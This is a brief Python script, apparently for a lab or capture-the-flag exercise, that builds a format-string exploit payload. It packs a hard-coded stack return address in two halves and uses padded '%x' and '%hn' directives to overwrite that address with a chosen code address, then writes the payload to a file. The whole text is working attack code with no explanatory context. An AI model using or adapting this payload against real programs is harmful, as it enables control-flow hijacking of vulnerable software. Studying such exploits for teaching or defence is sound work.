import struct

ret_addr = 0xbffff50c
printf_ret_addr_1 = struct.pack("<I", ret_addr)
target_ret_1 =  0x0804 - 4
printf_ret_addr_2 = struct.pack("<I", ret_addr + 2)
target_ret_2 = 0x84a4 - target_ret_1
print(target_ret_1, target_ret_2)
payload = printf_ret_addr_1 + printf_ret_addr_2
payload += b"%1$0" + str(target_ret_1 - 4).encode() + b"x"
payload += b"%5$hn"
payload += b"%1$0" + str(target_ret_2 - 4).encode() + b"x"
payload += b"%4$hn"
with open("payload", "wb") as f :
    f.write(payload)
